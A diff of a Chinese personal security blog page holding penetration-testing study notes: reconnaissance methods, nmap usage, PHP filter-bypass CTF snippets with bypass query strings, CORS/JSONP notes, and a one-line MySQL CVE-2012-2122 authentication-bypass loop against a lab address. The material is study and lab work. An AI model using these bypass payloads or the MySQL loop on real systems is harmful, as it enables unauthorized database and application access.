@@ -16,12 +16,12 @@
   <meta name="author" content="D4wn">
   <meta name="keywords" content="后端,博客,网络安全,爬虫,D4wn,d4wnnn,脚本,Selenium,计算机网络,操作系统">
   
-    <meta name="description" content="渗透信息打点 判断网站操作系统类型：  通过ICMP报文的TTL值判断 通过网站返回包的一些字段判断   判断网站使用的语言:  通过网站返回包的字段 通过搜索引擎，比如必应: site: acdawn.cn php   源码泄露:  CMS识别  网站备份文件  GIT源码泄露，例如https:&#x2F;&#x2F;trafficbonus.com&#x2F;.svn&#x2F;entries  SVN源码泄露  DS_Store源">
+    <meta name="description" content="渗透 信息打点  判断网站操作系统类型：  通过ICMP报文的TTL值判断 通过网站返回包的一些字段判断  判断网站使用的语言:  通过网站返回包的字段 通过搜索引擎，比如必应: site: acdawn.cn php  源码泄露:  CMS识别 网站备份文件 GIT源码泄露，例如https:&#x2F;&#x2F;trafficbonus.com&#x2F;.svn&#x2F;entries SVN">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透">
 <meta property="og:url" content="https://d4wnnn.github.io/2023/05/19/Security/%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="D4wn">
-<meta property="og:description" content="渗透信息打点 判断网站操作系统类型：  通过ICMP报文的TTL值判断 通过网站返回包的一些字段判断   判断网站使用的语言:  通过网站返回包的字段 通过搜索引擎，比如必应: site: acdawn.cn php   源码泄露:  CMS识别  网站备份文件  GIT源码泄露，例如https:&#x2F;&#x2F;trafficbonus.com&#x2F;.svn&#x2F;entries  SVN源码泄露  DS_Store源">
+<meta property="og:description" content="渗透 信息打点  判断网站操作系统类型：  通过ICMP报文的TTL值判断 通过网站返回包的一些字段判断  判断网站使用的语言:  通过网站返回包的字段 通过搜索引擎，比如必应: site: acdawn.cn php  源码泄露:  CMS识别 网站备份文件 GIT源码泄露，例如https:&#x2F;&#x2F;trafficbonus.com&#x2F;.svn&#x2F;entries SVN">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://d4wnnn.github.io/img/article_img_1.jpg">
 <meta property="article:published_time" content="2023-05-19T03:25:17.000Z">
@@ -436,112 +436,87 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><ul>
+                <h1 id="渗透">渗透</h1>
+<h1 id="信息打点">信息打点</h1>
+<ul>
 <li><p>判断网站操作系统类型：</p>
-<ol>
+<ol type="1">
 <li>通过ICMP报文的TTL值判断</li>
 <li>通过网站返回包的一些字段判断</li>
-</ol>
-</li>
+</ol></li>
 <li><p>判断网站使用的语言:</p>
-<ol>
+<ol type="1">
 <li>通过网站返回包的字段</li>
 <li>通过搜索引擎，比如必应: site: acdawn.cn php</li>
-</ol>
-</li>
+</ol></li>
 <li><p>源码泄露:</p>
-<ol>
-<li><p>CMS识别</p>
-</li>
-<li><p>网站备份文件</p>
-</li>
-<li><p>GIT源码泄露，例如<a target="_blank" rel="noopener" href="https://trafficbonus.com/.svn/entries">https://trafficbonus.com/.svn/entries</a></p>
-</li>
-<li><p>SVN源码泄露</p>
-</li>
-<li><p>DS_Store源码泄露</p>
-</li>
-<li><p>PHP的composer.json，例如<a target="_blank" rel="noopener" href="http://english.cmdesign.com.cn/composer.json">http://english.cmdesign.com.cn/composer.json</a></p>
-</li>
-<li><p>WEB-INF/web.xml泄露(常用于CTF，需要配合下载漏洞)</p>
-</li>
-<li><p>通过GITHUB搜索相关文件</p>
-</li>
+<ol type="1">
+<li><p>CMS识别</p></li>
+<li><p>网站备份文件</p></li>
+<li><p>GIT源码泄露，例如https://trafficbonus.com/.svn/entries</p></li>
+<li><p>SVN源码泄露</p></li>
+<li><p>DS_Store源码泄露</p></li>
+<li><p>PHP的composer.json，例如http://english.cmdesign.com.cn/composer.json</p></li>
+<li><p>WEB-INF/web.xml泄露(常用于CTF，需要配合下载漏洞)</p></li>
+<li><p>通过GITHUB搜索相关文件</p></li>
 </ol>
-<p>源码泄露参考：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a></p>
-</li>
+<p>源码泄露参考：https://www.secpulse.com/archives/124398.html</p></li>
 <li><p>为什么有时候服务器提供端口，但是却扫描不到？</p>
 <ul>
 <li>可能服务器部署在内网，让后搭建了反向代理，扫描时只能扫描到代理服务器</li>
-</ul>
-</li>
+</ul></li>
 <li><p>端口扫描：</p>
-<ol>
+<ol type="1">
 <li>NMAP</li>
 <li>MASSCAN</li>
-</ol>
-</li>
+</ol></li>
 </ul>
-<p>​	端口渗透总结:</p>
-<p>​	<a target="_blank" rel="noopener" href="https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/">https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</a></p>
+<p>​ 端口渗透总结:</p>
+<p>​
+https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</p>
 <ul>
-<li><p>旁注：同服务器下的不同WEB应用查询技术，可以利用一些在线工具</p>
-</li>
+<li><p>旁注：同服务器下的不同WEB应用查询技术，可以利用一些在线工具</p></li>
 <li><p>CDN检测:</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://get-site-ip.com/">https://get-site-ip.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li>
-<li><a target="_blank" rel="noopener" href="http://17ce.com/">http://17ce.com/</a></li>
-</ol>
-</li>
+<ol type="1">
+<li>https://ping.chinaz.com/</li>
+<li>https://get-site-ip.com/</li>
+<li>https://tools.ipip.net/cdn.php</li>
+<li>http://17ce.com/</li>
+</ol></li>
 <li><p>绕过CDN:</p>
-<ol>
-<li><p>从子域名入手</p>
-</li>
-<li><p>历史DNS记录</p>
-</li>
-<li><p>Mx记录或者邮件</p>
-</li>
-<li><p>国外请求</p>
-</li>
-<li><p>网络空间扫描历史文件</p>
-</li>
-<li><p>漏洞(比如ssrf,请求外部地址)</p>
-</li>
-</ol>
-</li>
+<ol type="1">
+<li><p>从子域名入手</p></li>
+<li><p>历史DNS记录</p></li>
+<li><p>Mx记录或者邮件</p></li>
+<li><p>国外请求</p></li>
+<li><p>网络空间扫描历史文件</p></li>
+<li><p>漏洞(比如ssrf,请求外部地址)</p></li>
+</ol></li>
 </ul>
-<p>​	参考资料：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/51380.html">https://www.secpulse.com/archives/51380.html</a></p>
+<p>​ 参考资料：https://www.secpulse.com/archives/51380.html</p>
 <ul>
 <li><p>WAF:</p>
 <ul>
-<li>看图识WAF：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/charon1937/p/13799467.html">https://www.cnblogs.com/charon1937/p/13799467.html</a></li>
-</ul>
-</li>
+<li>看图识WAF：https://www.cnblogs.com/charon1937/p/13799467.html</li>
+</ul></li>
 <li><p>负载均衡:</p>
 <ul>
 <li>LBD</li>
-</ul>
-</li>
+</ul></li>
 <li><p>APP信息搜集：</p>
-<ol>
+<ol type="1">
 <li><p>内在提取</p>
 <p>若出现错误，可能是APP存在壳，需要利用Xposed模块的dexdump或者frida模块的RRIDE-DEXDump</p>
-<p>Apk资源提取器可以提取APK文件，以及一些资源文件</p>
-</li>
+<p>Apk资源提取器可以提取APK文件，以及一些资源文件</p></li>
 <li><p>外在抓包</p>
-<p>Xposed的JustTrustMe工具可以配置Fiddler等证书，进而实现抓包</p>
-</li>
-</ol>
-</li>
+<p>Xposed的JustTrustMe工具可以配置Fiddler等证书，进而实现抓包</p></li>
+</ol></li>
 </ul>
 <p>附：</p>
 <blockquote>
 <p>PING命令的TTL</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WINDOWS</span> NT/<span class="hljs-number">2000</span>   TTL：<span class="hljs-number">128</span><br><span class="hljs-attribute">WINDOWS</span> <span class="hljs-number">95</span>/<span class="hljs-number">98</span>     TTL：<span class="hljs-number">32</span><br><span class="hljs-attribute">UNIX</span>              TTL：<span class="hljs-number">255</span><br><span class="hljs-attribute">LINUX</span>             TTL：<span class="hljs-number">64</span><br><span class="hljs-attribute">WIN7</span>              TTL：<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>
-
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/piaoxuan1987/article/details/79503554">https://blog.csdn.net/piaoxuan1987/article/details/79503554</a></p>
+<p>参考：https://blog.csdn.net/piaoxuan1987/article/details/79503554</p>
 </blockquote>
 <p>WEB-INF/web.xml下的文件解释</p>
 <blockquote>
@@ -554,15 +529,20 @@ mjx-container[display="true"] + br {
 <p>NMAP的使用</p>
 <blockquote>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">nmap -sS SYN半连接扫描，比较隐蔽</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">nmap -sT TCP全连接扫描，最稳定</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">nmap -sN 只能在Linux中使用，发送畸形的TCP报文，flags位全为0，躲避无状态防火墙的检测</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">eg：</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">nmap 192.168.126.144</span><br></code></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_1965839/5250918">https://blog.51cto.com/u_1965839/5250918</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ut411K7QJ?t=211.3&p=3">https://www.bilibili.com/video/BV1Ut411K7QJ?t=211.3&amp;p=3</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/16830628.html">https://www.cnblogs.com/Hekeats-L/p/16830628.html</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.nmd5.com/test/index.php">http://www.nmd5.com/test/index.php</a></p>
+<p>https://blog.51cto.com/u_1965839/5250918</p>
+<p>https://www.bilibili.com/video/BV1Ut411K7QJ?t=211.3&amp;p=3</p>
+<p>https://www.cnblogs.com/Hekeats-L/p/16830628.html</p>
+<p>http://www.nmd5.com/test/index.php</p>
 <p>主机扫描：</p>
 <p><code>nmap -PS -p 80,8080 192.168.126.1</code>：SYN扫描</p>
-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231027143707303.png" srcset="/img/loading.gif" lazyload alt="image-20231027143707303"></p>
-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231027143808116.png" srcset="/img/loading.gif" lazyload alt="image-20231027143808116"></p>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231027143707303.png" srcset="/img/loading.gif" lazyload alt="image-20231027143707303">
+<figcaption aria-hidden="true">image-20231027143707303</figcaption>
+</figure>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231027143808116.png" srcset="/img/loading.gif" lazyload alt="image-20231027143808116">
+<figcaption aria-hidden="true">image-20231027143808116</figcaption>
+</figure>
 <p><code>nmap -PA -p 80,8080 192.168.126.1</code>:ACK扫描</p>
 </blockquote>
 <p>MASSCAN的使用</p>
@@ -575,25 +555,26 @@ mjx-container[display="true"] + br {
 </blockquote>
 <p>历史DNS记录查询网站</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p>
-<p><a target="_blank" rel="noopener" href="https://x.threatbook.com/">https://x.threatbook.com/</a></p>
-<p><a target="_blank" rel="noopener" href="https://viewdns.info/">https://viewdns.info/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.17ce.com/">https://www.17ce.com/</a></p>
+<p>https://www.dnsdb.io/zh-cn/</p>
+<p>https://x.threatbook.com/</p>
+<p>https://viewdns.info/</p>
+<p>https://www.17ce.com/</p>
 </blockquote>
 <p>WHOIS原理</p>
 <blockquote>
-<p>IANA(Internet Assigned Numbers Authority): 互联网数字分配机构，负责管理全球域名，里面记录着全球所有顶级域名</p>
+<p>IANA(Internet Assigned Numbers Authority):
+互联网数字分配机构，负责管理全球域名，里面记录着全球所有顶级域名</p>
 <p>注意IANA是ICANN的其中一个机构</p>
-<p>全球所有顶级域名：<a target="_blank" rel="noopener" href="https://www.iana.org/domains/root/db">https://www.iana.org/domains/root/db</a></p>
+<p>全球所有顶级域名：https://www.iana.org/domains/root/db</p>
 <p>RFC812定义了Whois协议：首先在43端口建立一个tcp连接，然后发送关键字即可查询</p>
 <p>比如<code>.cn</code>的whois服务器是<code>whois.cnnic.cn</code></p>
 <p>于是可通过建立telnet连接来查询信息</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35221356">https://zhuanlan.zhihu.com/p/35221356</a></p>
+<p>参考：https://zhuanlan.zhihu.com/p/35221356</p>
 </blockquote>
 <p>DNS相关原理</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/05/root-domain.html">https://www.ruanyifeng.com/blog/2018/05/root-domain.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2022/08/dns-query.html">https://www.ruanyifeng.com/blog/2022/08/dns-query.html</a></p>
+<p>https://www.ruanyifeng.com/blog/2018/05/root-domain.html</p>
+<p>https://www.ruanyifeng.com/blog/2022/08/dns-query.html</p>
 </blockquote>
 <p>nslookup</p>
 <blockquote>
@@ -609,18 +590,18 @@ mjx-container[display="true"] + br {
 <li>ALIAS：别名</li>
 </ul>
 </blockquote>
-<h1 id="WEB攻防"><a href="#WEB攻防" class="headerlink" title="WEB攻防"></a>WEB攻防</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>过滤函数缺陷绕过</p>
-<p>参考资料: <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_65336233/article/details/127181355">https://blog.csdn.net/m0_65336233/article/details/127181355</a></p>
+<h1 id="web攻防">WEB攻防</h1>
+<h2 id="php">PHP</h2>
+<p>过滤函数缺陷绕过</p>
+<p>参考资料:
+https://blog.csdn.net/m0_65336233/article/details/127181355</p>
 <blockquote>
 <p>弱类型比较与强类型比较</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">==: 只比较数值，不比较类型<br>===: 数值和类型都比较<br></code></pre></td></tr></table></figure>
-
 <p>md5绕过1(两个等于号)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">"this is flag"</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'password'</span>]) {<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'password'</span>])) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'?'</span>;<br>    }<br>}<br><span class="hljs-comment">//http://127.0.0.1/?username=240610708&amp;password=QNKCDZO</span><br></code></pre></td></tr></table></figure>
-
 <p>md5绕过2(3个等于号)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">"this is flag"</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'password'</span>]) {<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'password'</span>])) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'?'</span>;<br>    }<br>}<br><span class="hljs-comment">//http://127.0.0.1/?username[]=1&amp;password[]=2</span><br></code></pre></td></tr></table></figure>
-
 <p>strpos()绕过</p>
 <ul>
 <li>利用%0a</li>
@@ -628,29 +609,27 @@ mjx-container[display="true"] + br {
 <p>in_array第三个参数安全</p>
 <p>若第三个参数为false，则不会检测数据类型</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">'this is flag'</span>;<br><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">'1'</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'i'</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>,<span class="hljs-literal">false</span>)) {<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"yes"</span>;<br>}<br><span class="hljs-comment">//http://127.0.0.1/?i=+1</span><br></code></pre></td></tr></table></figure>
-
 <p>preg_match()绕过</p>
 <p>若传递的是一个数组，则会直接绕过</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">'this is flag'</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])) {<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[0-9]/"</span>, <span class="hljs-variable">$num</span>)) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>)) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>}<br><span class="hljs-comment">//http://127.0.0.1/?num[]=1</span><br></code></pre></td></tr></table></figure>
-
 <p>str_replace()绕过</p>
 <p>str_replace()无法迭代替换</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">'this is flag'</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'s'</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'select'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br><span class="hljs-comment">//http://127.0.0.1/?s=selselectect</span><br></code></pre></td></tr></table></figure>
-
 <p>综合题目</p>
 <p>preg_match过滤了x，无法使用16进制，前面强类型比较$num，代表无法使用+等过滤，只能使用进制转换；为绕过strpos，需要在前面加上+或者空格</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">'this is flag'</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])) {<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> === <span class="hljs-string">'4476'</span>) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no no no'</span>);<br>    }<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-z]/i"</span>, <span class="hljs-variable">$num</span>)) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no no no'</span>);<br>    }<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">"0"</span>)) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no no no'</span>);<br>    }<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">4476</span>) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>}<br><span class="hljs-comment">//http://127.0.0.1/?num=+010574</span><br></code></pre></td></tr></table></figure>
-
 </blockquote>
-<h2 id="通用安全漏洞"><a href="#通用安全漏洞" class="headerlink" title="通用安全漏洞"></a>通用安全漏洞</h2><p>前置知识</p>
+<h2 id="通用安全漏洞">通用安全漏洞</h2>
+<p>前置知识</p>
 <blockquote>
 <p>同源策略(SOP)包括三个条件</p>
-<ol>
+<ol type="1">
 <li>同协议</li>
 <li>通端口</li>
 <li>同域名</li>
 </ol>
-<p>同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互 是浏览器的一种安全策略</p>
+<p>同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互
+是浏览器的一种安全策略</p>
 <p>但是限制的一些前端功能的实现 所以就有了许多跨域的手段</p>
 <p>前端的访问后端 若出现跨域问题 是前端的问题</p>
 </blockquote>
@@ -662,128 +641,150 @@ mjx-container[display="true"] + br {
 <p>CORS</p>
 <blockquote>
 <ul>
-<li><p>Cross-Orgin Resource Sharing 跨域资源共享 允许浏览器向跨源服务器发送XMLHttpRequest请求</p>
-</li>
-<li><p>CORS支持所有形式的http请求</p>
-</li>
-<li><p>用户A登录自己的后台或者其他页面 访问了第三方页面 第三方页面请求用户A访问页面的内容 页面源码泄露</p>
-</li>
-<li><p>CORS只能获得资源 不能像CSRF达到添加用户之类的操作</p>
-</li>
-<li><p>类似CSRF 但是若有同源策略 CSRF失效</p>
-</li>
-<li><p><code>Acess-Control-Allow-Orgin：*</code>表示其他页面能获取此页面的资源</p>
-</li>
-<li><p>利用条件：用户登录且有安全问题 只能获取资源文件</p>
-</li>
+<li><p>Cross-Orgin Resource Sharing 跨域资源共享
+允许浏览器向跨源服务器发送XMLHttpRequest请求</p></li>
+<li><p>CORS支持所有形式的http请求</p></li>
+<li><p>用户A登录自己的后台或者其他页面 访问了第三方页面
+第三方页面请求用户A访问页面的内容 页面源码泄露</p></li>
+<li><p>CORS只能获得资源 不能像CSRF达到添加用户之类的操作</p></li>
+<li><p>类似CSRF 但是若有同源策略 CSRF失效</p></li>
+<li><p><code>Acess-Control-Allow-Orgin：*</code>表示其他页面能获取此页面的资源</p></li>
+<li><p>利用条件：用户登录且有安全问题 只能获取资源文件</p></li>
 </ul>
 </blockquote>
 <p>JSONP</p>
 <blockquote>
 <p>JSNOP只支持get 不支持post</p>
 <p>jsonp跨域巧妙的利用了script标签能跨域的特点 实现了json的跨域传输</p>
-<p>用户A浏览器访问过虎牙 优酷 淘宝等页面 攻击者尝试去测试这些官方的回调(callback)页面</p>
+<p>用户A浏览器访问过虎牙 优酷 淘宝等页面
+攻击者尝试去测试这些官方的回调(callback)页面</p>
 </blockquote>
 <p>工具使用</p>
 <blockquote>
 <ul>
 <li><p>dnsub-子域名扫描工具</p>
 <p>类似OneForAll 但是速度快</p>
-<p><code>https://github.com/yunxu1/dnsub</code></p>
-</li>
+<p><code>https://github.com/yunxu1/dnsub</code></p></li>
 <li><p>CORScanner</p>
-<p><code>https://github.com/chenjj/CORScanner</code></p>
-</li>
-</ul>
-<ul>
+<p><code>https://github.com/chenjj/CORScanner</code></p></li>
 <li><p>Corsy</p>
-<p><code>https://github.com/s0md3v/Corsy</code></p>
-</li>
+<p><code>https://github.com/s0md3v/Corsy</code></p></li>
 </ul>
 </blockquote>
-<h1 id="服务攻防"><a href="#服务攻防" class="headerlink" title="服务攻防"></a>服务攻防</h1><p>常见服务应用的安全测试</p>
-<ol>
+<h1 id="服务攻防">服务攻防</h1>
+<p>常见服务应用的安全测试</p>
+<ol type="1">
 <li>配置不当导致未授权访问</li>
 <li>弱口令</li>
 <li>安全漏洞</li>
 </ol>
 <p>安全测试流程</p>
-<ol>
+<ol type="1">
 <li><p>判断服务是否开放</p>
-<ol>
+<ol type="1">
 <li><p>端口扫描</p>
-<p>若有服务但是端口扫描不到，可能是内网，也可能是安全防护软件，也可能是修改了默认端口</p>
-</li>
+<p>若有服务但是端口扫描不到，可能是内网，也可能是安全防护软件，也可能是修改了默认端口</p></li>
+</ol></li>
+<li><p>判断服务类型</p></li>
 </ol>
-</li>
-<li><p>判断服务类型</p>
-</li>
-</ol>
-<h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><blockquote>
-<h2 id="CVE-2012-2122-身份认证绕过漏洞"><a href="#CVE-2012-2122-身份认证绕过漏洞" class="headerlink" title="CVE-2012-2122-身份认证绕过漏洞"></a>CVE-2012-2122-身份认证绕过漏洞</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`;<span class="hljs-keyword">do</span> mysql -uroot -pwrong -h 172.30.158.168 -P 3306;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>攻击机:172.30.152.248</p>
+<h2 id="数据库安全">数据库安全</h2>
+<h3 id="mysql">MySQL</h3>
+<blockquote>
+<h2 id="cve-2012-2122-身份认证绕过漏洞">CVE-2012-2122-身份认证绕过漏洞</h2>
+<h3 id="exp">exp</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`;<span class="hljs-keyword">do</span> mysql -uroot -pwrong -h 172.30.158.168 -P 3306;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<h3 id="复现">复现</h3>
+<p>攻击机:172.30.152.248</p>
 <p>靶机:172.30.158.168</p>
